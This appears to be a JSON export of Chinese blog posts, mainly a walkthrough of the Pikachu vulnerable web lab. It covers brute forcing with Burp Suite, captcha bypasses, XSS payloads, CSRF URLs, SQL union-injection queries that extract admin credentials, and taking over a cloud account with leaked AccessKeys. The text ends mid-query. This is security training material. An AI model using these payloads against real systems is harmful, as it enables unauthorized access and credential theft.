&#125;  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n假设这是一个真实的网站，我们直接f12查看源代码，搜索一下相关的关键字比如accessKey、secretKey\n\n\n\n这里就能看到他的key泄露了，同样我们也可以利用插件 findshomthing，来帮助我们快速判断存不存在相关的泄露，然后再进行查找\n\n\n\n然后我们就可以利用一些工具或者网站去接管那个云平台，这里演示的是ak_as后cf利用工具，首先按照他的要求配置一下，选择阿里云\n\n\n\n然后按照要求填写id和key即可，token可以不用填\n\n\n\n显示这样就是配置成功了，我们cf alibaba查看可以使用的命令，按照相对应的命令操作即可\n\n\n或者可以使用一些网站，也可以进行接管\n\n\n\n\n前端验证逻辑绕过\n\n\n小迪演示的相关网站寄了，app好像也寄了，这里拿ai演示下\n1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;  &lt;html&gt;  &lt;head&gt;      &lt;meta charset=&quot;utf-8&quot; /&gt;      &lt;title&gt;登录 Demo&lt;/title&gt;      &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;  &lt;h2&gt;登录&lt;/h2&gt;  &lt;form id=&quot;loginForm&quot;&gt;      &lt;input type=&quot;text&quot;     name=&quot;username&quot; placeholder=&quot;用户名&quot; required /&gt;      &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;   required /&gt;      &lt;button type=&quot;submit&quot;&gt;登录&lt;/button&gt;  &lt;/form&gt;  &lt;p id=&quot;msg&quot;&gt;&lt;/p&gt;    &lt;script&gt;      $(&#x27;#loginForm&#x27;).on(&#x27;submit&#x27;, function (e) &#123;          e.preventDefault();          $.ajax(&#123;              url: &#x27;login.php&#x27;,              type: &#x27;POST&#x27;,              data: $(this).serialize(),              dataType: &#x27;json&#x27;,              success: function (res) &#123;                  $(&#x27;#msg&#x27;).text(res.message || &#x27;&#x27;);                  if (res.code **= 200) &#123;                      window.location.href = &#x27;home.html&#x27;;                  &#125;              &#125;,              error: function () &#123;                  $(&#x27;#msg&#x27;).text(&#x27;网络错误&#x27;);              &#125;          &#125;);      &#125;);  &lt;/script&gt;  &lt;/body&gt;  &lt;/html&gt;\n\n\n后端采用php判断页面的跳转\n12345678910111213141516171819&lt;?php  header(&#x27;Content-Type: application/json&#x27;);  header(&#x27;Access-Control-Allow-Origin: *&#x27;);   // 方便本地调试，可省    $u = $_POST[&#x27;username&#x27;] ?? &#x27;&#x27;;  $p = $_POST[&#x27;password&#x27;] ?? &#x27;&#x27;;    if ($u **= &#x27;admin&#x27; &amp;&amp; $p **= &#x27;123456&#x27;) &#123;      echo json_encode([          &#x27;code&#x27;    =&gt; 200,          &#x27;message&#x27; =&gt; &#x27;登录成功，即将跳转……&#x27;      ]);  &#125; else &#123;      echo json_encode([          &#x27;code&#x27;    =&gt; 403,          &#x27;message&#x27; =&gt; &#x27;用户名或密码错误！&#x27;      ]);  &#125;  ?&gt;\n\n\n\n我们随便输入一个账号秘密，f12看看数据包：\n\n\n\n根据他返回的结果，我们去源代码全局搜索下，如果他的判断逻辑是写在前端的话，我们能看见\n\n\n\n可以看到他这里的判断逻辑是res.code **= 200就算返回成功，并且跳转的地址我们也能看见，home.html\n\n\n这个时候我们重新登录，并抓下包\n\n\n\n按照前面讲过的操作将响应包也抓下，不然会直接放包的\n\n\n\n将403改成200，再发包\n\n\n\n成功了\n\n\n像这种将判断逻辑写在前端的，都会给我们审计代码和攻击的机会，判断逻辑等最好是写在后端\n\n\n\nURL、接口地址暴露\n\n如果某些敏感地址没有进行身份验证的话，我们就可以直接访问，造成未授权，src经常用这招；也相当于发现更多网址，增大攻击面\n一般我们都会用到 findsomething 这个插件，总不能自己在一堆js里面找路径吧\n\n","slug":"网安知识点","date":"2025-11-02T02:00:00.000Z","categories_index":"网安基础","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"5a29724b6f0247fd1b534cffc1124eba","title":"Pikachu靶场攻略（持续更新中）","content":"Pikachu漏洞平台练习\n一、暴力破解\n概述\n\n\n“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。\n\n\n理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：\n\n\n1.是否要求用户设置复杂的密码；\n2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；\n3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；\n4.是否采用了双因素认证；\n…等等\n\n\n暴力破解漏洞测试流程\n1.确认目标登录接口的脆弱性\n\n确认目标是否存在暴力破解的漏洞。（确认被暴力破解的“可能性”）\n比如：尝试登录-抓包-观察验证元素和response信息，判断是否存在暴力破解的可能\n\n2.对字典进行优化\n\n根据实际的情况对字典进行优化，提高爆破过程的效率\n\n3.工具自动化操作\n\n配置自动化工具（比如线程，超时时间，重试次数等），进行自动化的操作\n\n4.字典优化技巧\n\n技巧一：\n\n根据注册提示信息进行优化对目标站点进行注册，搞清楚账号密码的一些限制，比如目标站点要求密码必须是6位以上，字母数字组合，则可以按照此优化字典，比如去掉不符合要求的密码。\n\n\n技巧二：\n\n如果爆破的是管理后台，往往这种系统的管理员是admin/administrator/root的机率比较高，可以使用这三个账号+随便一个密码，尝试登录，观看返回的结果，确定用户名。\n比如：\n输入xxx/yyyf返回“用户名或密码错误”；\n输入admin/yyy返回“密码错误&quot;，则基本可以确定用户名是admin;\n因此可以只对密码进行爆破即可，提高效率。\n\n\n\n1.基于表单的暴力破解\n\n\n基于表单的暴力破解，其实说白了就是没有任何验证码和防护措施的，最为简单的暴力破解\n\n\n\n这里我们要利用的是burpsuit这款工具，这个工具在学习安全的道路上会经常使用，小白可以通过b站搜索相关内容进行下载安装\n\n\n要使用这款工具，我们需要导入证书和开启127.0.0.1:8080代理（当然用bp自带的浏览器也是可以的），详细步骤可以参考下这篇文章[Burp Suite CA证书下载及导入教程](Burp Suite CA证书下载及导入教程_burp证书下载-CSDN博客)\n\n\n当一切准备就绪，我们就可以利用bp抓到浏览器的数据包了！（这里插一嘴，如果你的证书和代理都整好了的话还是抓不了本地的包，可以将127.0.0.1或者localhost换成你本地的ipv4地址，win + r 输入cmd，在命令行里面输入ipconfig，找到自己的ipv4地址）\n\n\n首先我们点击Intercept is off这个按钮，将所有的通过这个端口的数据包拦截下来\n\n\n\n然后随便输账号和密码，点击登录\n\n\n\n可以看到这时已经成功抓到了，接下来我们要将这个登录的这个数据包放到我们的爆破模块，这也是我们抓包的目的\n\n\n\n进入到爆破模块后，我们选择一下其中的Cluster bomb的模式，这个相当于将你的字典的所有组合全部进行爆破，也是爆破最常用的模式，详细区别可以看下这篇文章[Burp Suite爆破模块中的四种模式的区别详解和演示(暴力破解)](Burp Suite爆破模块中的四种模式的区别详解和演示(暴力破解)_bpcluster bomb-CSDN博客)\n\n\n选择之后，先按下右边的clear按钮，将自带参数清除，然后选中我们输入的账号和密码，进行add\n\n\n\n接着，我们点击payloads选项，添加我们要爆破的字典，因为pikachu右上角的提示给了我们正确的密码，这里我们将正确和错误的账号、密码混在一起当做我们的字典，在payload1和2里面分别添加\n\n\n\n添加完成后点击右上角的Start attack，开始爆破\n\n\n\n爆破成功后，我们不需要一个一个看返回的内容，可以点击length查看长度来进行判断，这里很明显第一行的长度与其他的都不一样，尝试后发现可以成功登录，那么恭喜你最简单的爆破流程你已经学会了。\n\n\n2.验证码绕过(on server)\n\n\n来到这一关，我们会发现多了一个验证码，当我们尝试输入错的账号密码还有验证码时告诉我们，验证码错误\n\n\n\n而当我们输入正确的验证码和错误的账号密码时，则会提示 username or password is not exists～\n\n\n\n当我们进行这两次尝试可以发现，只有当页面刷新的时候，验证码才会重新刷新，那我们不刷新页面同一个正确的验证码是否会有效呢，我们这里输入一个正确的验证码和错误的密码抓个包试验一下，并将抓到的包放到Reteater（重放模块）中\n\n\n\n修改一下原来的账号和密码，重新发送几次\n\n\n\n\n这里可以基本确认他的验证码只要不刷新就是有效的，那么抓包放到爆破模块的时候保证验证码是页面上正确的就行，其他操作和上面没有变化\n\n\n3.验证码绕过(on client)\n\n\n来到第三关，我们依旧先输入错误的账号和验证码进行尝试，而当我们验证码错误的时候，他会出现一个弹窗，提示我们验证码输入错误\n\n\n\n但我们点击确认的时候，发现页面并没有任何加载的迹象，但验证码刷新了，由此可以判断，这个验证码的验证实在前端页面上进行的，那么这一关就很简单了，对于懂安全的来说，任何在前端进行的验证，都是没有任何意义的，我们只需要先按f12再按f1，将javascript禁用就可以了\n\n\n\n\n这里可以看到，验证码已经没有显示了，剩下的还是按照第一关的步骤进行爆破就可以了\n\n\n4.token防爆破\n\n\n在做这关之前，推荐大家可以先去了解一下什么是token，详细可以看这篇文章什么是token？token是用来干嘛的？，总的来说token就相当于给每个请求发一个独一无二的编号，用它来进行验证\n\n\n我们这里先f12进行查看\n\n\n\n在登录按钮的上面可以看到题目的token，在有token的干扰下，我们的爆破流程要稍加改变，因为即使有token连发两个也会报错，但由于token的值回显在前端页面上，我们就可以配置一个正则重定向，让BP每次爆破的时候自动爬取这个token值\n\n\n还是先随便输入密码，进行登录抓包，并发送到爆破模块，这里我们选择的攻击模式是Pitchfork，他的功能就是多个字典同时进行\n\n\n\n接着我们点击Setings，在下面找到Gerp-Extract，然后依次点击这两个按钮\n\n\n\n在下面搜索token，找到那个token值，选中复制，然后点击ok\n\n\n\n然后回到payloads选项，前两个账号密码添加的方式不变，第三个token的时候，选择Recursive grep（递归搜索），将我们刚才复制的token值粘贴到下面\n\n\n\n接着来到resource pool模块，选择创建新的资源池，并把最大请求数改为1\n\n\n\n然后开始攻击即可\n\n\n\n最后爆破成功！\n\n\n二、XSS（跨站脚本攻击）\n概述\n\nCross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。一般XSS可以分为如下几种常见类型：\n\n反射型 XSS\n存储型 XSS\nDOM型 XSS\n\n\nXSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。\nXSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。\n形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。\n因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:\n\n输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;\n输出转义：根据输出点的位置对输出到前端的内容进行适当转义;\n\n\n\n1.反射型 XSS （get）\n\n\n\n打开题目，问我们我们最喜欢的 NBA 球星，这里我们随便输入一个\n\n\n\n通过观察我们发现，我们输入的球星名字会在前端页面显示出来，那么这里就可能存在XSS漏洞\n\n\n由于他是通过GET请求来进行传参的，那我们尝试构造前端语言的payload\n1&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;\n\n\n但当我们输入到 (‘xss’) 的时候发现超过了长度限制\n\n\n那么我们f12，选中这个输入框，将最大长度改成100\n\n\n\n\n\n2.反射型 XSS （post）\n\n打开题目，发现是一个登录页面，我们点一下提示，先进行账号登录（也可以利用上面学到的知识，进行暴力破解）\n登录完事后，发现和上一题没什么太大的区别，输入喜欢的球星后，依旧会在前端界面显示，只不过这里使用post进行传参，那我们的操作不变，最后成功造成反射型xss\npayload：&lt;script&gt;alert('xss')&lt;/script&gt;\n\n12345678910111213141516171819这里简单讲述下get请求和post的区别GET 和 POST 是 HTTP 协议中最常用的两种请求方法，它们在数据传输方式、安全性、数据量限制等方面存在显著差异。数据传输方式 GET 请求通过 URL 传递参数，参数以 key=value 的形式附加在 URL 后，用 ? 分隔，多个参数用 &amp; 连接。例如：/test?name=John&amp;age=30。 POST 请求则将参数放在 HTTP 请求的消息体中，用户无法直接看到这些数据。安全性 GET 请求的参数会显示在 URL 中，因此容易被记录在浏览器历史、服务器日志中，安全性较低，尤其不适合传输敏感信息如密码。 POST 请求的参数不会显示在 URL 中，安全性相对较高，适合传输敏感数据。数据量限制 GET 请求受 URL 长度限制（通常为 2048 个字符），因此传输数据量较小。 POST 请求没有明确的数据长度限制，可以传输大量数据，适合文件上传等场景。缓存和历史记录 GET 请求可以被缓存，参数会保留在浏览器历史记录中，适合用于获取数据。 POST 请求不会被缓存，参数也不会保留在历史记录中。编码类型 GET 请求只支持 ASCII 字符，传输非 ASCII 数据时需要编码。 POST 请求支持多种编码方式，包括 application/x-www-form-urlencoded 和 multipart/form-data，后者适用于二进制数据。性能和效率 GET 请求通常只需要一个 TCP 数据包即可完成，效率较高。 POST 请求可能需要两个 TCP 数据包：第一个发送请求头，第二个发送请求体，因此性能稍逊。使用场景 GET 适用于获取数据，例如查询操作。 POST 适用于提交数据，例如表单提交或文件上传。总结来说，GET 和 POST 的选择应根据具体需求决定。GET 更适合无状态、无敏感数据的请求，而 POST 则适合需要更高安全性和传输大量数据的场景。\n3.存储型 XSS\n\n\n\n存储型XSS是持久化的XSS攻击方式，它将恶意代码存储于服务器端，比如数据库、留言页面、日志文件等，当其他用户访问该页面时就会触发代码，造成xss攻击\n\n\n这个漏洞的危害就比较大了，因为它是插入到一个正常页面的，你只需要浏览就能够触发\n\n\n那么我们来看这道题，他给了我们一个留言板，说明我们写进去的内容会被存储起来并进行显示，这里很就有可能出现存储型的xss，实战中也可以多留意一下留言板相关的功能\n\n\npayload：&lt;script&gt;alert('xss')&lt;/script&gt;\n\n\n\n当我们每次刷新界面进行访问的时候都会触发 xss，这就是存储型 xss 的影响\n\n\n4.DOM型 XSS\n123这里简单介绍下什么是DOMDOM 是一种用于表示和操作HTML、XML等文档结构的编程接口，通过它可以使用代码来访问、修改和操作Web页面的内容和结构。与反射型和存储型XSS不同，DOM型XSS不需要将恶意脚本传输到服务器，而是直接在客户端执行，因此更难检测和防御。\n\n详细可见：[DOM-XSS攻击原理](DOM-XSS攻击原理与防御 - Mysticbinary - 博客园)\n\n\n\n\n打开题目，我们随便输入一些内容，然后f12检查一下，我们刚才输入的内容\n\n\n\n这里我们需要将语句闭合并进行payload的构造，可以看到他这里用的是a标签，各种标签和绕过方法可以看这篇文章： [xss过滤绕过总结](XSS过滤绕过总结 - 随风kali - 博客园)\n\n\n但这里双引号闭合却没有成功，我们打开源代码发现，外面其实还有一个单引号\n\n\n\n那么我们最后的payload为：' onclick=alert('xss')&gt;\n\n\n闭合后的完整语句为：&lt;a href='' onclick=alert(‘xss’)&gt;'&gt;what do you see?&lt;/a&gt;\n\n\n5.DOM型 XSS-X\n\n这一关和上一关的payload没什么区别，唯一的区别就是他是get请求从url获取我们提交的内容\n这里就不过多解释了\n\n6.XSS 盲打\n\n\nXSS 盲打（Blind Cross-Site Scripting）是跨站脚本攻击的一种高级形式，其核心特点是攻击者无法直接观察攻击效果，需依赖特定用户（如管理员）在未来某个时间点触发存储在服务器上的恶意代码。\n\n\nXSS 盲打属于存储型 XSS 的变种，但攻击流程存在显著差异。攻击者将恶意脚本注入到网站的输入点（如留言板、用户资料编辑框），脚本被存储在服务器数据库中，不会立即在当前用户浏览器执行。当管理员或其他用户访问包含该脚本的页面时，浏览器会自动解析并执行脚本，导致攻击生效。\n\n\n其实简单来说也可以叫黑盒测试\n\n\n我们回到题目，首先我们构造一个 xss 的 payload，检查后发现看不到代码，无法判断成功与否\n1&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;\n\n\n我们点开提示，他告诉了我们后台的地址，我们访问一下\n\n\n\n\n成功弹窗，我们检查一下，发现语句确实写进去了\n\n\n\n7.XSS之过滤\n\n\n根据我们的题目，我们可以得知他应该是对我们的xss语句进行了一定程度的过滤，我们先用我们之前的payload来尝试一下\n1&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;\n\n\n发现提交之后只剩个&gt;了\n\n\n\n经过尝试我们可以发现，&lt;script&gt;标签被过滤了，但我们可以利用其他的标签来进行xss攻击\n1&lt;a href=&quot;&quot; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;\n\n\n8.XSS之htmlspecialchars\n\n\n这里先简单介绍下htmlspecialchars函数是干什么的：\n1htmlspecialchars() 是 PHP 中的一个内置函数，用于将特定的 HTML 字符转换为 HTML 实体字符，从而防止跨站脚本攻击（XSS）。在 HTML 中，某些字符如 &lt;, &gt;, &quot;, &#x27; 和 &amp; 具有特殊含义，分别代表 HTML 的标签、结束标签、字符引用和实体引用。通过将这些字符转换为 HTML 实体，可以防止它们被浏览器解释为 HTML 标签或字符引用。\n\n\n我们还是用我们原来的payload进行尝试，可以发现并不能成功执行，我们f12进行检查一下\n\n\n\n可以发现原来的&lt;变成了&amp;lt原来的&gt;变成了&amp;gt\n\n\n那我们直接输入尖括号和一些别的符号测试一下\n\n\n\n观察发现他并没有过滤单引号，那么我们就可以利用这一点来构造payload，这里使用的是a标签\n1&lt;a href=&#x27;&#x27; onclick=&#x27;alert(&quot;xss&quot;)&#x27;&gt;\n\n\n完整语句\n1&lt;a href=&#x27;&#x27; onclick=&#x27;alert(&quot;xss&quot;)&#x27;&gt;\n\n\n最后成功弹窗\n\n\n\n9.XSS之href输出\n1HTML &lt;a&gt; 标签的 href 属性用于指定链接的目标 URL。它可以是绝对 URL、相对 URL、锚点、电子邮件地址、电话号码或 JavaScript 代码段。\n\n\n我们先进行输入尝试\n\n\n\n可以发现我们输入的内容在a标签的href中，而且在url中也能发现输入的内容\n\n\n\n我们右键查看下源码后发现，他对我们输入的尖括号和单双引号进行了过滤\n\n\n\n那么我们就可以尝试用JavaScript协议来执行js语句\n\n\n12345678JavaScript 协议（javascript:）是一种特殊的 URL 协议，用于在浏览器中直接执行 JavaScript 代码。它通常用于动态生成内容或执行特定操作，但需要谨慎使用以避免安全问题。JavaScript 协议的基本用法javascript: 协议允许在 URL 中嵌入 JavaScript 代码，浏览器会解析并执行这些代码。例如：javascript:alert(&#x27;Hello, World!&#x27;);当在浏览器地址栏中输入上述代码时，会弹出一个提示框显示 &quot;Hello, World!&quot;。如果代码返回一个值且不是 undefined，浏览器会将返回值作为页面内容显示。\n\n\n我们最后的payload为：\n1javascript:alert(&#x27;xss&#x27;)\n\n\n\n10.XSS之js输出\n\n\n依旧输出之前的payload进行简单的尝试\n1&lt;scirpt&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;\n\n\n并没有成功，我们查看下源码\n\n\n\n观察发现，&lt;script&gt;多出来一个，那么我们需要将他闭合掉，将语句写进去\n\n\npayload为：\n1&lt;/script&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;\n\n\n总结\n\n当我们在实战进行挖掘的时候要留意一些可能会出现xss漏洞的地方比如：\n\n数据交互的地方\n数据输出的地方\n任何可以自定义输入数据的地方都可以尝试 `XSS\n\n\n进行黑盒测试的时候我们要记住这几个步骤：\n\n页面中显示的数据找可控的（有些隐藏的）\n利用可控地方发送 JS 代码去看执行加载情况\n成功执行即 XSS，不能成功执行就 F12 看语句输出的地方显示情况（过滤）\n根据显示分析为什么不能执行，尝试绕过（实体化、闭合、关键词过滤等）\n\n\npikachu上的偏向基础，大家一定要学会灵活运用\n\n三、CSRF（跨站请求伪造）\n概述\n\n\nCSRF（Cross-Site Request Forgery），也叫跨站请求伪造，是一种网络攻击手段，攻击者通过诱导用户在 已认证的状态下 访问恶意链接或页面，迫使用户的浏览器向目标服务器发送非预期的请求，从而执行攻击者预设的操作（如转账、修改密码、发表评论等）。\n\n\n\n其实很好理解，就像上面那张图一样，假设我现在抓到了支付宝的转账数据包如下：\n12345678910111213141516171819202122232425262728293031323334353637  http://www.alipay.com/pay.php?name=ling&amp;account=12732834&amp;money=10000- 然后我们搭建一个网站，让这个网站去直接加载这个数据包自动跳转，最后把这个网站的网址发给受害者- 如果这时受害者正处于支付宝的登录的状态下，那么他就会自动进行这个转账- 这就是典型的 `CSRF` 攻击**利用条件**- 从上面可以看到，CSRF 的利用条件有三点：  - 需要请求伪造的数据包（可以通过 cms 之类的自己搭建并抓包想要利用别人的权限进行的操作）  - 网站没有过滤防护或者有防护但可以绕过  - 受害者要已经成功登录状态或者打开网站，而且要点击我们的恶意网站### 1.CSRF（get）- 我们先点击右上角的提示，随便登录一个账号- 进入之后，是我们登录账号的个人信息  ![image-20250920112113291](../images/Pikachu靶场练习/image-20250920112113291.png)- 然后我们点击修改个人信息，随便修改几个内容  ![image-20250920112701554](../images/Pikachu靶场练习/image-20250920112701554.png)- 点击提交，并进行抓包  ![image-20250920112809228](../images/Pikachu靶场练习/image-20250920112809228.png)- 通过观察我们可以发现，我们修改的内容是通过get请求发送的，并且内容会在url上面显示，那么我们是不是就可以修改上面的参数，来达到我们攻击的目的，这里可以改成我们自己想要修改的内容（比如自己的邮箱之类的），然后将修改后的整个url复制下来，那么我们构成的CSRF攻击payload为  ```http  http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hacker&amp;phonenum=hacker&amp;add=hacker&amp;email=hacker&amp;submit=submit\n\n\n然后我们将这个payload，发送给已经登录成功的受害者，进行CSRF攻击，这里我们以受害者的视角演示一下\n\n\n\n现在受害者的信息是这样的，假如我是lili，别人给我发了这样的网址，不知道是什么，很好奇，于是lili进行了访问\n1http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hacker&amp;phonenum=hacker&amp;add=hacker&amp;email=hacker&amp;submit=submit\n\n\n\n可以看到这时我们的访问的网址内容是我们的个人信息，且已经被修改了，那我们回到我们原来的登录界面，并进行刷新\n\n\n\n发现我们原来的内容也被修改了，这就是 CSRF 的攻击流程\n\n\n而利用条件要满足受害者已经成功登录状态或者打开网站，而且要点击我们的恶意网站，这也是CSRF少的原因，这还是没有考虑防护的情况，由此可见想要使用 CSRF 攻击还是很苛刻的\n\n\n2.CSRF（post）\n\n\n这里只是请求发生了变化，但实际和上面没有太大区别，但这里我用 bp 来进行另外一种 CSRF payload的生成方式来进行讲解\n\n\n首先，我们还是提交修改的内容并进行抓包\n\n\n\n然后按下面的这种图依次点击\n\n\n\n然后找到我们想要修改的内容，并进行修改\n\n\n\n点击 Test in browser，复制生成的链接\n\n\n\n然后发给我们的受害者，让他进行访问\n\n\n\n点击按钮，之后跳转到了登录界面，可以看到最后成功修改\n\n\n\n这样的好处是，我们发的url具有隐蔽性，受害者会以为是这个网站的链接从而取消戒心，除了这种方法，也可以利用短链接来生成payload，这里就不再演示\n\n\n3.CSRF（token）\n\n\nCSRF（token）顾名思义，这里就是使用了token来进行防护 CSRF 攻击\n\n\n\n查看这道题的源码发现，里面有一个set_token()的函数，当我们每次进行刷新的时候，就会将 session中的token销毁，并生成一个新的发送到前端中，而当我们进行 CSRF 攻击的时候，由于不知道对方当前页面的 token值，从而无法进行 CSRF 攻击\n\n\n四、SQL注入\n概述\n\n在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。一个严重的SQL注入漏洞，可能会直接导致一家公司破产！\nSQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。\n在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：\n\n对传进SQL语句里面的变量进行过滤，不允许危险字符传入；\n使用参数化（Parameterized Query 或 Parameterized Statement）\n还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了&quot;拼接&quot;的方式,所以使用时需要慎重!\n\n\n\n什么是sql注入？\n\n\nSQL注入就是指Web应用程序对用户输入数据的合理性没有进行判断，前端传入后端的参数是攻击者可控制的，并且根据参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库进行任意查询。下面以PHP语句为例作为展示：\n1q u e r y = &quot; S E L E C T ∗ F R O M u s e r s W H E R E i d = query=&quot; SELECT*FROM users WHERE id=query=&quot;SELECT∗FROMusersWHEREid=_GET [‘id’] &quot;;\n\n\n像这样，参数id可控，且可以带入数据库进行查询，那么非法用户就可以任意拼接sql语句进行攻击\n\n\n当然sql注入存在的主要原因就是程序员在开发的时候没有对用户输入的字符串进行过滤、转义，限制或者说是处理的不严谨，导致攻击者可以通过精心构造的字符串去非法获取到数据库中的数据。\n\n\n数字型注入\n\n\n当传入的参数为整形时，如果存在注入漏洞，那么我们就可以称他为数字型注入\n\n\n假如这是后端的sql语句\n1select * from news where id = $id;\n\n\n我们通过get传入id的值，然后程序在进行对应的查询，那么如果我们这时候输入的是3'，这时拼接到语句中就会报错\n1select * from news where id = 3&#x27;;\n\n\n输入and 1=1，拼接到语句中就会执行正常，与原始页面没什么差异\n1select * from news where id = 3 and 1=1;\n\n\n输入and 1=2，拼接到语句可以正常执行，但无法查询到结果，返回的数据与原始页面存在差异\n1select * from news where id = 3 and 1=2;\n\n\n如果满足以上几点，则可以判断这里存在数字型的注入\n\n\n字符型注入\n\n\n当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的，这里也先拿单引号来让你们理解什么是字符串注入\n1select * from table where name=&#x27;admin&#x27;;\n\n\n当我们输入admin'，这时就有三个单引号了，程序无法执行，发生报错\n1select * from table where name=&#x27;admin&#x27;&#x27;;\n\n\n输入admin'and 1=1，此时的sql语句还是会多出来一个，我们可以用sql语句中的注释符号比如#或者--+，但如果是url传参的话就不要用#了，这个时候返回界面成功了\n1select * from table where name=&#x27;admin&#x27;and 1=1 --+&#x27;;\n\n\n输入admin' and 1=2 --+，返回错误\n1234567891011121314151617181920212223242526272829303132333435363738  select * from table where name=&#x27;admin&#x27;and 1=2 --+&#x27;;- 满足以上几点，就可以说是存在字符型注入### 1.数字型的注入（post）- 现在我们用 Pikachu靶场 这道题来演示下数字型注入  ![image-20250927131208540](../images/Pikachu靶场练习/image-20250927131208540.png)- 他让我们选择一个数字，然后返回相对应的数据，这个场景很符合数字型注入，我们来抓包进行测试一下  ![image-20250927131454170](../images/Pikachu靶场练习/image-20250927131454170.png)- 右键发送到重放模块，将id =1 改成`1 and 1=1`  ![image-20250927131740328](../images/Pikachu靶场练习/image-20250927131740328.png)- 可以看到没有任何报错，改成`1 and 1=2`试一下  ![image-20250927132243932](../images/Pikachu靶场练习/image-20250927132243932.png)- 可以看到并没有进行正确的回显，经过测试说明这里面可能就会有数字型的注入### 联合注入- 如果经过测试，已经知道了注入点和绕过方式，且页面会有我们我们想要的回显，这时就可以用到我们的联合注入了- 所谓联合注入，就是在正常传入数据的时候，额外再执行我们插入的恶意语句，就像下面这样  ```mysql  union select 1,2,3,4，group_concat(id,usename,password),6 from admin\n\n\n由于大部分的查询是在数据库里的其中一张表上进行的，虽然可以利用1' or 1=1将这张表里其他的内容都爆出来，但是却不能查到别的表的数据，想要实现这一功能，我们就需要了解到 MySQL 里面自带的一些表\n\n\n在 MySQL 5.0即以上的版本：自带的数据库名为information_schema\n123information_schema  #存储数据库下的数据库名及表名，列名信息的表&quot;.&quot;代表下一级 select *from security.usersinfomation_schema.schemata #记录数据库的表\n\n1information_schema.tables   #记录表名信息的表\n\n\n​\t\t\n\n\n记录列名的表\n1information_schema.columns   #记录列名信息表\n\n1234567schema_name：information_schema.schemata  #记录数据库名信息的列名值（数据库名字）table_schema：information_schema.tables   #记录数据库名的列名值table_name：information_schema.tables     #记录表名的列名值column_name：information_schema.columns   #记录列名的列名值\n\n\n\n我们可以通过联合查询利用以上这些表来得到我们想要的库名和表名，但在这之前我们还需要进行以下的几个操作\n\n\n确定当前表一共有几列，这样我们才能进行后续操作时不会报错\n123456  order by 6   #确认有几列，报错与不报错，取不报错那列（如果by 7报错，by 6不报错，那么这个表就有6列- 然后再确定一下页面的回显，如果你查询了1,2,3,4,5,6这几列，但页面只显示4和5，那就说明只有4和5列是在页面上回显的，后续操作也要在这两个列上进行  ```mysql  union select 1,2,3,4,5,6   #找能看见回显的\n\n\n接着就可以进行相对应的查询了，先看下数据库的名字和连接的用户（判断是不是root账户）\n1union select 1,2,3,database(),user(),6    #联合查询数据库名和数据库连接的用户  这里的回显就当做是demo1 root\n\n\n然后就是我们上面提到的那几张表的利用了，通过他们来获取到我们想要的表名和列名（比如账号和密码）,具体的语句看我下面的内容\n1union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema = &#x27;demo1&#x27;   #查demo1数据库中的表名，group_concat是查全部的表名  回显是admin \n\n\n查完表名查列名\n1union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_schema = &#x27;demo1&#x27;  and table_name = &#x27;admin&#x27;    #查admin表中的列名 回显为id、username、password\n\n\n最后拿到admin表中的 id、账号和密码\n1union select 1,2,3,4，group_concat(id,usename,password),6 from 